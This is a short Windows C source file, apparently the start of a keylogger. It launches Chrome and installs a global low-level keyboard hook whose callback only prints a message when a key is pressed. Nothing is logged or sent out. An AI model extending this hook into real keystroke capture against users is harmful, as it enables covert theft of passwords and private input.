#include "keylogger.h"

HINSTANCE hinst;
static HHOOK handlekeyboard = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{	
	printf("i pressed a key!\n");
	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
}

void	setwinhook()
{
	STARTUPINFO startup;
	PROCESS_INFORMATION process;
	
	SecureZeroMemory(&startup, sizeof(startup));
	SecureZeroMemory(&process, sizeof(process));
	startup.cb = sizeof(startup);
	if (CreateProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startup, &process) == 0)
		return;
	//WaitForSingleObject(process.hProcess, INFINITE);
//	hinst = GetModuleHandle(NULL);
	hinst = GetModuleHandle(L"chrome.exe");
	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0)) == NULL)
		return;
	CloseHandle(process.hProcess);
	CloseHandle(process.hThread);
}

int	main(void)
{
	MSG msg;

	setwinhook();				
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(handlekeyboard);
	return (msg.wParam);
}